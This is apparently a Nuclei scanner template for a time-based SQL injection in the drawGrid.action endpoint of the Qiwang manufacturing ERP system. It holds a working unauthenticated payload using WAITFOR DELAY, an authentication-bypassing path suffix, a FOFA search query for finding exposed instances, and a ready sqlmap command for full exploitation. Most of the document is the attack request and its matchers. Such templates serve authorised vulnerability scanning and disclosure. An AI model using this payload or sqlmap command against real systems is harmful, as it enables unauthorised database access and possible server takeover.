id: wantit-erp-drawGrid_action-sqli
info:
  name: 企望制造 ERP 系统 drawGrid.action - sqli
  author: leadlife
  severity: high
  description: 企望制造ERP系统 drawGrid.action 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://github.com/wy876/POC/blob/7b901f2d74fd35dab03f6ebeb289c9d2e14ddaa0/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0ERP/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0ERP%E7%B3%BB%E7%BB%9FdrawGrid.action%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="企望-ERP系统" || title="企望制造ERP系统"
    hunter-query: demo
    tips: tablename=*
    repair:
    sqlmap: sqlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --dbms=mssql --technique=T
  tags: wantif,sqli,erp,qiwang,time

http:
  - raw:        
      - |
        @timeout: 15s
        POST /mainFunctions/drawGrid.action;cookieLogin.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        tablename=1';WAITFOR DELAY '0:0:6'--
      
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains_all(body,'xtype','rownumber')
        condition: and